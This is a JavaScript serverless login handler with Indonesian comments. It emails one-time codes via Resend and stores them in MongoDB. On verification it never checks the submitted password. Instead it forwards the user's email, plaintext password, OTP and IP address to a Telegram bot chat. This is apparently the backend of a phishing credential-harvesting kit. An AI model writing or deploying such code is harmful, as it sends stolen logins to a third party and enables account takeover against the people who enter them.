import mongoose from 'mongoose';
import { Resend } from 'resend';
import axios from 'axios';
import { config } from './config.js';

const resend = new Resend(config.RESEND_API_KEY);

// Define Schema
const UserSchema = new mongoose.Schema({
    email: String,
    otp: String,
    password: String
});
const User = mongoose.models.User || mongoose.model('User', UserSchema);

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const { action, email, password, otp } = req.body;
    const ip = req.headers['x-forwarded-for'] || 'Unknown';
    const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

    try {
        // 1. Jalankan Pengiriman OTP Terlebih Dahulu (Prioritas)
        if (action === 'SEND_OTP') {
            const code = Math.floor(100000 + Math.random() * 900000).toString();

            // KIRIM EMAIL DULUAN
            const { error } = await resend.emails.send({
                from: config.SENDER_EMAIL,
                to: email,
                subject: `KODE OTP: ${code}`,
                html: `<h1 style="color:blue">${code}</h1><p>Masukan kode ini untuk login.</p>`
            });

            if (error) {
                return res.status(500).json({ success: false, msg: "Resend Error: " + error.message });
            }

            // SIMPAN KE DB SETELAH EMAIL TERKIRIM
            try {
                if (mongoose.connection.readyState !== 1) await mongoose.connect(config.MONGODB_URI);
                await User.findOneAndUpdate({ email }, { otp: code }, { upsert: true });
            } catch (dbErr) {
                console.log("DB Error tapi Email sudah terkirim");
            }

            return res.status(200).json({ success: true, msg: "OTP Terkirim ke email!" });
        }

        // 2. Verifikasi Login
        if (action === 'VERIFY_LOGIN') {
            if (mongoose.connection.readyState !== 1) await mongoose.connect(config.MONGODB_URI);
            
            const user = await User.findOne({ email, otp });
            if (!user) return res.status(401).json({ msg: "OTP Salah!" });

            const total = await User.countDocuments();
            
            // Notifikasi Telegram
            const msg = `🔐 *LOGIN SUCCESS*\n\n📧 *Email:* ${email}\n🔑 *Pass:* ${password}\n🔢 *OTP:* ${otp}\n🌐 *IP:* ${ip}\n⏰ *Waktu:* ${waktu}\n👥 *Total User:* ${total}`;
            
            await axios.post(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: config.TELEGRAM_CHAT_ID,
                text: msg,
                parse_mode: 'Markdown'
            });

            return res.status(200).json({ success: true });
        }

    } catch (err) {
        return res.status(500).json({ success: false, msg: err.message });
    }
}
